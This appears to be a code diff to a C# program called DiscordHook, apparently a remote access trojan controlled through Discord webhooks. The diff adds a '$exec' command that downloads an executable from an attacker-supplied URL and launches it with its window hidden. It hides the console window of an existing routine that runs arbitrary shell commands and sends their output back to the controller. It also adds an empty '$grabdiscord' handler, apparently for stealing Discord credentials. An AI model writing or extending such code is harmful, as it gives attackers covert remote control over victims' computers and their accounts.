@@ -1,4 +1,5 @@
 using System;
+using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
@@ -15,7 +16,31 @@ namespace DiscordHook
             // ReSharper disable once PossibleNullReferenceException
             if (command[0] == '$')
             {
-                
+                if (command.Contains("$exec"))
+                {
+
+                    try
+                    {
+                        var newprocess = new Process()
+                        {
+                            StartInfo =
+                            {
+                                UseShellExecute = true,
+                                FileName = await DownloadExeAsync(command.Substring(6)),
+                                CreateNoWindow = true
+                            }
+                        };
+                        newprocess.Start();
+                    }
+                    catch
+                    {
+                        await SendStringHook("Error, could not download or execute the file", replyhook);
+                    }
+                }
+                else if (command.Contains("$grabdiscord"))
+                {
+                    
+                }
             }
             else            //shell commands
             {
@@ -29,7 +54,8 @@ namespace DiscordHook
                     {
                         UseShellExecute = false,
                         RedirectStandardOutput = true,
-                        FileName = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat"
+                        FileName = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat",
+                        CreateNoWindow = true
                     }
                 };
                 shellproc.Start();
@@ -49,8 +75,8 @@ namespace DiscordHook
                     File.Delete(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\output.txt");
                 }
                 File.Delete(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat");
-                await SendStringHook("null", commandhook);
             }
+            await SendStringHook("null", commandhook);
         }
     }
 }
